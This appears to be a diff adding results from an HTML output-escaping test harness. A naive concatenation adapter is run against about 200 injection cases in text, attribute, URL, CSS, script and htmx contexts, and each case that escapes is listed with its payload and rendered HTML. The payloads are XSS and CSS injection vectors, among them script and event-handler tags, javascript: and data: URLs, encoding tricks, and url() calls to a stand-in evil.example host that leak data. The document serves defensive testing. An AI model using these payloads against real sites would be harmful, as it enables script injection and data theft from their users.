@@ -1,0 +1,406 @@
+adapter: naive-concat (calibration)  cases: 206  K3 escapes (xss+css): 118
+┌─────────┬────────────────────┬─────────┬─────┬─────┬────────┬──────────┬──────┬────────┬────────┬─────────────┐
+│ (index) │ ctx                │ hostile │ xss │ css │ legacy │ rejected │ safe │ benign │ broken │ unsupported │
+├─────────┼────────────────────┼─────────┼─────┼─────┼────────┼──────────┼──────┼────────┼────────┼─────────────┤
+│ 0       │ 'text'             │ 8       │ 6   │ 0   │ 0      │ 0        │ 2    │ 3      │ 0      │ 0           │
+│ 1       │ 'rcdata-textarea'  │ 2       │ 2   │ 0   │ 0      │ 0        │ 0    │ 1      │ 0      │ 0           │
+│ 2       │ 'rcdata-title'     │ 1       │ 1   │ 0   │ 0      │ 0        │ 0    │ 1      │ 0      │ 0           │
+│ 3       │ 'attr-title'       │ 7       │ 2   │ 0   │ 0      │ 0        │ 5    │ 1      │ 1      │ 0           │
+│ 4       │ 'attr-data'        │ 7       │ 2   │ 0   │ 0      │ 0        │ 5    │ 1      │ 1      │ 0           │
+│ 5       │ 'attr-id'          │ 3       │ 2   │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 6       │ 'attr-class'       │ 3       │ 2   │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 7       │ 'attr-input-value' │ 7       │ 2   │ 0   │ 0      │ 0        │ 5    │ 1      │ 1      │ 0           │
+│ 8       │ 'attr-name'        │ 6       │ 5   │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 9       │ 'url-href'         │ 15      │ 14  │ 0   │ 0      │ 0        │ 1    │ 5      │ 0      │ 0           │
+│ 10      │ 'url-img-src'      │ 14      │ 13  │ 0   │ 0      │ 0        │ 1    │ 4      │ 0      │ 0           │
+│ 11      │ 'url-iframe-src'   │ 15      │ 13  │ 0   │ 0      │ 0        │ 2    │ 3      │ 0      │ 0           │
+│ 12      │ 'url-form-action'  │ 15      │ 14  │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 13      │ 'url-formaction'   │ 15      │ 14  │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 14      │ 'style-value'      │ 8       │ 1   │ 1   │ 3      │ 0        │ 3    │ 3      │ 0      │ 0           │
+│ 15      │ 'style-element'    │ 8       │ 2   │ 3   │ 2      │ 0        │ 1    │ 3      │ 0      │ 0           │
+│ 16      │ 'json-script'      │ 7       │ 4   │ 0   │ 0      │ 0        │ 3    │ 1      │ 0      │ 0           │
+│ 17      │ 'js-script-var'    │ 7       │ 4   │ 0   │ 0      │ 0        │ 3    │ 1      │ 0      │ 0           │
+│ 18      │ 'htmx-get'         │ 4       │ 3   │ 0   │ 0      │ 0        │ 1    │ 1      │ 0      │ 0           │
+│ 19      │ 'htmx-confirm'     │ 3       │ 3   │ 0   │ 0      │ 0        │ 0    │ 1      │ 1      │ 0           │
+│ 20      │ 'htmx-vals'        │ 5       │ 1   │ 0   │ 0      │ 0        │ 4    │ 1      │ 0      │ 0           │
+│ 21      │ 'htmx-headers'     │ 5       │ 1   │ 0   │ 0      │ 0        │ 4    │ 1      │ 0      │ 0           │
+│ 22      │ 'iframe-srcdoc'    │ 3       │ 3   │ 0   │ 0      │ 0        │ 0    │ 1      │ 0      │ 0           │
+│ 23      │ 'TOTAL'            │ 168     │ 114 │ 4   │ 5      │ 0        │ 45   │ 38     │ 4      │ 0           │
+└─────────┴────────────────────┴─────────┴─────┴─────┴────────┴──────────┴──────┴────────┴────────┴─────────────┘
+ESCAPE:XSS  text/script  payload="<script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<div><script>alert(1)</script></div>"
+ESCAPE:XSS  text/img-onerror  payload="<img src=x onerror=alert(1)>"
+            [xss] structure: <img> inside the element; [xss] event handler onerror
+            html: "<div><img src=x onerror=alert(1)></div>"
+ESCAPE:XSS  text/close-and-script  payload="</div><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] script element
+            html: "<div></div><script>alert(1)</script></div>"
+ESCAPE:XSS  text/svg-script  payload="<svg><script>alert(1)</script></svg>"
+            [xss] structure: <svg> inside the element; [xss] script element
+            html: "<div><svg><script>alert(1)</script></svg></div>"
+ESCAPE:XSS  text/comment-open  payload="<!--<img src=x onerror=alert(1)>"
+            [xss] structure: sentinel swallowed; [xss] structure: 1 top-level elements, expected 2
+            html: "<div><!--<img src=x onerror=alert(1)></div>"
+ESCAPE:XSS  text/iframe-js  payload="<iframe src=javascript:alert(1)>"
+            [xss] structure: sentinel swallowed; [xss] structure: 1 top-level elements, expected 2; [xss] structure: <iframe> inside the element; [xss] javascript: URL in src
+            html: "<div><iframe src=javascript:alert(1)></div>"
+ESCAPE:XSS  rcdata-textarea/close  payload="</textarea><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] script element
+            html: "<textarea></textarea><script>alert(1)</script></textarea>"
+ESCAPE:XSS  rcdata-textarea/close-upper  payload="</TEXTAREA ><img src=x onerror=alert(1)>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] event handler onerror
+            html: "<textarea></TEXTAREA ><img src=x onerror=alert(1)></textarea>"
+ESCAPE:XSS  rcdata-title/close  payload="</title><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] script element
+            html: "<title></title><script>alert(1)</script></title>"
+ESCAPE:XSS  attr-title/dq-breakout  payload="\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<div title=\"\" onmouseover=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-title/tag-breakout  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<div title=\"\"><script>alert(1)</script>\"></div>"
+BROKEN      attr-title/tom-and-jerry  payload="Tom & Jerry \"<3\" it's"
+            html: "<div title=\"Tom & Jerry \"<3\" it's\"></div>"
+ESCAPE:XSS  attr-data/dq-breakout  payload="\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<div data-note=\"\" onmouseover=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-data/tag-breakout  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<div data-note=\"\"><script>alert(1)</script>\"></div>"
+BROKEN      attr-data/tom-and-jerry  payload="Tom & Jerry \"<3\" it's"
+            html: "<div data-note=\"Tom & Jerry \"<3\" it's\"></div>"
+ESCAPE:XSS  attr-id/dq-breakout  payload="\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<div id=\"\" onmouseover=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-id/tag-breakout  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<div id=\"\"><script>alert(1)</script>\"></div>"
+ESCAPE:XSS  attr-class/dq-breakout  payload="\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<div class=\"\" onmouseover=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-class/tag-breakout  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<div class=\"\"><script>alert(1)</script>\"></div>"
+ESCAPE:XSS  attr-input-value/dq-breakout  payload="\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<input value=\"\" onmouseover=\"alert(1)\">"
+ESCAPE:XSS  attr-input-value/tag-breakout  payload="\"><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] script element
+            html: "<input value=\"\"><script>alert(1)</script>\">"
+BROKEN      attr-input-value/tom-and-jerry  payload="Tom & Jerry \"<3\" it's"
+            html: "<input value=\"Tom & Jerry \"<3\" it's\">"
+ESCAPE:XSS  attr-name/space-handler  payload={"key":"x onmouseover","value":"alert(1)"}
+            [xss] event handler onmouseover
+            html: "<div data-x onmouseover=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-name/tag-breakout  payload={"key":"x\"><img src=x onerror=alert(1)>","value":"1"}
+            [xss] structure: <img> inside the element; [xss] event handler onerror
+            html: "<div data-x\"><img src=x onerror=alert(1)>=\"1\"></div>"
+ESCAPE:XSS  attr-name/hx-on  payload={"key":"hx-on:click","value":"alert(1)"}
+            [xss] htmx handler data-hx-on:click
+            html: "<div data-hx-on:click=\"alert(1)\"></div>"
+ESCAPE:XSS  attr-name/hx-get-js  payload={"key":"hx-get","value":"javascript:alert(1)"}
+            [xss] htmx js: action in data-hx-get
+            html: "<div data-hx-get=\"javascript:alert(1)\"></div>"
+ESCAPE:XSS  attr-name/hx-trigger-load-js  payload={"key":"hx-post","value":"js:alert(1)"}
+            [xss] htmx js: action in data-hx-post
+            html: "<div data-hx-post=\"js:alert(1)\"></div>"
+ESCAPE:XSS  url-href/js  payload="javascript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"javascript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-upper  payload="JAVASCRIPT:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"JAVASCRIPT:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-leading-space  payload="  javascript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"  javascript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-leading-c0  payload="\u0001javascript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"\u0001javascript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-tab  payload="java\tscript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"java\tscript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-newline  payload="java\nscript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"java\nscript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/js-comment-newline  payload="javascript://%0aalert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"javascript://%0aalert(1)\">link</a>"
+ESCAPE:XSS  url-href/vbscript  payload="vbscript:msgbox(1)"
+            [xss] vbscript: URL in href
+            html: "<a href=\"vbscript:msgbox(1)\">link</a>"
+ESCAPE:XSS  url-href/data-html  payload="data:text/html,<script>alert(1)</script>"
+            [xss] scriptable data: URL in href
+            html: "<a href=\"data:text/html,<script>alert(1)</script>\">link</a>"
+ESCAPE:XSS  url-href/data-html-b64  payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            [xss] scriptable data: URL in href
+            html: "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">link</a>"
+ESCAPE:XSS  url-href/data-svg  payload="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
+            [xss] scriptable data: URL in href
+            html: "<a href=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">link</a>"
+ESCAPE:XSS  url-href/breakout-dq  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<a href=\"\"><script>alert(1)</script>\">link</a>"
+ESCAPE:XSS  url-href/entity-js  payload="&#106;avascript:alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"&#106;avascript:alert(1)\">link</a>"
+ESCAPE:XSS  url-href/entity-colon  payload="javascript&colon;alert(1)"
+            [xss] javascript: URL in href
+            html: "<a href=\"javascript&colon;alert(1)\">link</a>"
+ESCAPE:XSS  url-img-src/js  payload="javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"javascript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-upper  payload="JAVASCRIPT:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"JAVASCRIPT:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-leading-space  payload="  javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"  javascript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-leading-c0  payload="\u0001javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"\u0001javascript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-tab  payload="java\tscript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"java\tscript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-newline  payload="java\nscript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"java\nscript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/js-comment-newline  payload="javascript://%0aalert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"javascript://%0aalert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/vbscript  payload="vbscript:msgbox(1)"
+            [xss] vbscript: URL in src
+            html: "<img src=\"vbscript:msgbox(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/data-html  payload="data:text/html,<script>alert(1)</script>"
+            [xss] scriptable data: URL in src
+            html: "<img src=\"data:text/html,<script>alert(1)</script>\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/data-html-b64  payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            [xss] scriptable data: URL in src
+            html: "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/breakout-dq  payload="\"><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] script element
+            html: "<img src=\"\"><script>alert(1)</script>\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/entity-js  payload="&#106;avascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"&#106;avascript:alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-img-src/entity-colon  payload="javascript&colon;alert(1)"
+            [xss] javascript: URL in src
+            html: "<img src=\"javascript&colon;alert(1)\" alt=\"x\">"
+ESCAPE:XSS  url-iframe-src/js  payload="javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"javascript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-upper  payload="JAVASCRIPT:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"JAVASCRIPT:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-leading-space  payload="  javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"  javascript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-leading-c0  payload="\u0001javascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"\u0001javascript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-tab  payload="java\tscript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"java\tscript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-newline  payload="java\nscript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"java\nscript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/js-comment-newline  payload="javascript://%0aalert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"javascript://%0aalert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/vbscript  payload="vbscript:msgbox(1)"
+            [xss] vbscript: URL in src
+            html: "<iframe src=\"vbscript:msgbox(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/data-html  payload="data:text/html,<script>alert(1)</script>"
+            [xss] scriptable data: URL in src
+            html: "<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>"
+ESCAPE:XSS  url-iframe-src/data-html-b64  payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            [xss] scriptable data: URL in src
+            html: "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>"
+ESCAPE:XSS  url-iframe-src/data-svg  payload="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
+            [xss] scriptable data: URL in src
+            html: "<iframe src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\"></iframe>"
+ESCAPE:XSS  url-iframe-src/entity-js  payload="&#106;avascript:alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"&#106;avascript:alert(1)\"></iframe>"
+ESCAPE:XSS  url-iframe-src/entity-colon  payload="javascript&colon;alert(1)"
+            [xss] javascript: URL in src
+            html: "<iframe src=\"javascript&colon;alert(1)\"></iframe>"
+ESCAPE:XSS  url-form-action/js  payload="javascript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"javascript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-upper  payload="JAVASCRIPT:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"JAVASCRIPT:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-leading-space  payload="  javascript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"  javascript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-leading-c0  payload="\u0001javascript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"\u0001javascript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-tab  payload="java\tscript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"java\tscript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-newline  payload="java\nscript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"java\nscript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/js-comment-newline  payload="javascript://%0aalert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"javascript://%0aalert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/vbscript  payload="vbscript:msgbox(1)"
+            [xss] vbscript: URL in action
+            html: "<form action=\"vbscript:msgbox(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/data-html  payload="data:text/html,<script>alert(1)</script>"
+            [xss] scriptable data: URL in action
+            html: "<form action=\"data:text/html,<script>alert(1)</script>\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/data-html-b64  payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            [xss] scriptable data: URL in action
+            html: "<form action=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/data-svg  payload="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
+            [xss] scriptable data: URL in action
+            html: "<form action=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/breakout-dq  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<form action=\"\"><script>alert(1)</script>\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/entity-js  payload="&#106;avascript:alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"&#106;avascript:alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-form-action/entity-colon  payload="javascript&colon;alert(1)"
+            [xss] javascript: URL in action
+            html: "<form action=\"javascript&colon;alert(1)\" method=\"post\"></form>"
+ESCAPE:XSS  url-formaction/js  payload="javascript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"javascript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-upper  payload="JAVASCRIPT:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"JAVASCRIPT:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-leading-space  payload="  javascript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"  javascript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-leading-c0  payload="\u0001javascript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"\u0001javascript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-tab  payload="java\tscript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"java\tscript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-newline  payload="java\nscript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"java\nscript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/js-comment-newline  payload="javascript://%0aalert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"javascript://%0aalert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/vbscript  payload="vbscript:msgbox(1)"
+            [xss] vbscript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"vbscript:msgbox(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/data-html  payload="data:text/html,<script>alert(1)</script>"
+            [xss] scriptable data: URL in formaction
+            html: "<button type=\"submit\" formaction=\"data:text/html,<script>alert(1)</script>\">Go</button>"
+ESCAPE:XSS  url-formaction/data-html-b64  payload="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+            [xss] scriptable data: URL in formaction
+            html: "<button type=\"submit\" formaction=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">Go</button>"
+ESCAPE:XSS  url-formaction/data-svg  payload="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>"
+            [xss] scriptable data: URL in formaction
+            html: "<button type=\"submit\" formaction=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">Go</button>"
+ESCAPE:XSS  url-formaction/breakout-dq  payload="\"><script>alert(1)</script>"
+            [xss] structure: <script> inside the element; [xss] script element
+            html: "<button type=\"submit\" formaction=\"\"><script>alert(1)</script>\">Go</button>"
+ESCAPE:XSS  url-formaction/entity-js  payload="&#106;avascript:alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"&#106;avascript:alert(1)\">Go</button>"
+ESCAPE:XSS  url-formaction/entity-colon  payload="javascript&colon;alert(1)"
+            [xss] javascript: URL in formaction
+            html: "<button type=\"submit\" formaction=\"javascript&colon;alert(1)\">Go</button>"
+ESCAPE:CSS  style-value/decl-injection  payload="red; background-image: url(https://evil.example/leak)"
+            [css] 2 declarations in style attribute, expected 1
+            html: "<div style=\"color: red; background-image: url(https://evil.example/leak)\"></div>"
+ESCAPE:XSS  style-value/attr-breakout  payload="red\" onmouseover=\"alert(1)"
+            [xss] event handler onmouseover
+            html: "<div style=\"color: red\" onmouseover=\"alert(1)\"></div>"
+LEGACY      style-value/rule-breakout  payload="red}body{background:url(https://evil.example/leak)"
+            [legacy] url() inside the color value (invalid CSS, inert)
+            html: "<div style=\"color: red}body{background:url(https://evil.example/leak)\"></div>"
+LEGACY      style-value/expression  payload="expression(alert(1))"
+            [legacy] expression() in style attribute
+            html: "<div style=\"color: expression(alert(1))\"></div>"
+LEGACY      style-value/url-js  payload="url(javascript:alert(1))"
+            [legacy] url() inside the color value (invalid CSS, inert)
+            html: "<div style=\"color: url(javascript:alert(1))\"></div>"
+ESCAPE:CSS  style-element/decl-injection  payload="red; background-image: url(https://evil.example/leak)"
+            [css] 2 declarations in the <style> rule, expected 1
+            html: "<style>.x{color: red; background-image: url(https://evil.example/leak)}</style>"
+ESCAPE:CSS  style-element/rule-breakout  payload="red}body{background:url(https://evil.example/leak)"
+            [css] 2 rule openings, 2 closings in <style>, expected 1; [legacy] url() inside the color value (invalid CSS, inert)
+            html: "<style>.x{color: red}body{background:url(https://evil.example/leak)}</style>"
+ESCAPE:XSS  style-element/style-close  payload="red}</style><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] script element
+            html: "<style>.x{color: red}</style><script>alert(1)</script>}</style>"
+ESCAPE:XSS  style-element/style-close-upper  payload="red}</STYLE ><img src=x onerror=alert(1)>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] event handler onerror
+            html: "<style>.x{color: red}</STYLE ><img src=x onerror=alert(1)>}</style>"
+LEGACY      style-element/expression  payload="expression(alert(1))"
+            [legacy] expression() in <style>
+            html: "<style>.x{color: expression(alert(1))}</style>"
+LEGACY      style-element/url-js  payload="url(javascript:alert(1))"
+            [legacy] url() inside the color value (invalid CSS, inert)
+            html: "<style>.x{color: url(javascript:alert(1))}</style>"
+ESCAPE:CSS  style-element/comment-escape  payload="red/*"
+            [css] comment or backslash escape in <style>
+            html: "<style>.x{color: red/*}</style>"
+ESCAPE:XSS  json-script/script-close  payload="</script><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element
+            html: "<script type=\"application/json\">{\"v\":\"</script><script>alert(1)</script>\"}</script>"
+ESCAPE:XSS  json-script/script-close-upper  payload="</SCRIPT ><img src=x onerror=alert(1)>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] event handler onerror
+            html: "<script type=\"application/json\">{\"v\":\"</SCRIPT ><img src=x onerror=alert(1)>\"}</script>"
+ESCAPE:XSS  json-script/double-escape  payload="<!--<script>"
+            [xss] structure: sentinel swallowed; [xss] structure: 1 top-level elements, expected 2
+            html: "<script type=\"application/json\">{\"v\":\"<!--<script>\"}</script>"
+ESCAPE:XSS  json-script/comment-close-then-script  payload="<!--</script><script>alert(1)//-->"
+            [xss] structure: 3 top-level elements, expected 2
+            html: "<script type=\"application/json\">{\"v\":\"<!--</script><script>alert(1)//-->\"}</script>"
+ESCAPE:XSS  js-script-var/script-close  payload="</script><script>alert(1)</script>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element
+            html: "<script>window.__DATA = {\"v\":\"</script><script>alert(1)</script>\"}</script>"
+ESCAPE:XSS  js-script-var/script-close-upper  payload="</SCRIPT ><img src=x onerror=alert(1)>"
+            [xss] structure: 3 top-level elements, expected 2; [xss] structure: text outside the element; [xss] event handler onerror
+            html: "<script>window.__DATA = {\"v\":\"</SCRIPT ><img src=x onerror=alert(1)>\"}</script>"
+ESCAPE:XSS  js-script-var/double-escape  payload="<!--<script>"
+            [xss] structure: sentinel swallowed; [xss] structure: 1 top-level elements, expected 2
+            html: "<script>window.__DATA = {\"v\":\"<!--<script>\"}</script>"
+ESCAPE:XSS  js-script-var/comment-close-then-script  payload="<!--</script><script>alert(1)//-->"
+            [xss] structure: 3 top-level elements, expected 2
+            html: "<script>window.__DATA = {\"v\":\"<!--</script><script>alert(1)//-->\"}</script>"
+ESCAPE:XSS  htmx-get/js-prefix  payload="js:alert(1)"
+            [xss] htmx js: action in hx-get
+            html: "<button hx-get=\"js:alert(1)\">Load</button>"
+ESCAPE:XSS  htmx-get/javascript-prefix  payload="javascript:alert(1)"
+            [xss] htmx js: action in hx-get
+            html: "<button hx-get=\"javascript:alert(1)\">Load</button>"
+ESCAPE:XSS  htmx-get/breakout  payload="\" hx-on:click=\"alert(1)"
+            [xss] htmx handler hx-on:click
+            html: "<button hx-get=\"\" hx-on:click=\"alert(1)\">Load</button>"
+ESCAPE:XSS  htmx-confirm/js-prefix  payload="js:alert(1)"
+            [xss] htmx js: value in hx-confirm
+            html: "<button hx-post=\"/items/1\" hx-confirm=\"js:alert(1)\">Delete</button>"
+ESCAPE:XSS  htmx-confirm/javascript-prefix  payload="javascript:alert(1)"
+            [xss] htmx js: value in hx-confirm
+            html: "<button hx-post=\"/items/1\" hx-confirm=\"javascript:alert(1)\">Delete</button>"
+ESCAPE:XSS  htmx-confirm/breakout  payload="\" hx-on:click=\"alert(1)"
+            [xss] htmx handler hx-on:click
+            html: "<button hx-post=\"/items/1\" hx-confirm=\"\" hx-on:click=\"alert(1)\">Delete</button>"
+BROKEN      htmx-confirm/question  payload="Delete \"Q3 <draft>\" & its notes?"
+            html: "<button hx-post=\"/items/1\" hx-confirm=\"Delete \"Q3 <draft>\" & its notes?\">Delete</button>"
+ESCAPE:XSS  htmx-vals/sq-attr-breakout  payload="' hx-on:click='alert(1)"
+            [xss] htmx handler hx-on:click
+            html: "<button hx-post=\"/items\" hx-vals='{\"q\":\"' hx-on:click='alert(1)\"}'>Save</button>"
+ESCAPE:XSS  htmx-headers/sq-attr-breakout  payload="' hx-on:click='alert(1)"
+            [xss] htmx handler hx-on:click
+            html: "<button hx-post=\"/items\" hx-headers='{\"X-Note\":\"' hx-on:click='alert(1)\"}'>Save</button>"
+ESCAPE:XSS  iframe-srcdoc/script  payload="<script>alert(1)</script>"
+            [xss] srcdoc runs: script element
+            html: "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>"
+ESCAPE:XSS  iframe-srcdoc/img-onerror  payload="<img src=x onerror=alert(1)>"
+            [xss] srcdoc runs: event handler onerror
+            html: "<iframe srcdoc=\"<img src=x onerror=alert(1)>\"></iframe>"
+ESCAPE:XSS  iframe-srcdoc/attr-breakout  payload="\" onload=\"alert(1)"
+            [xss] event handler onload
+            html: "<iframe srcdoc=\"\" onload=\"alert(1)\"></iframe>"
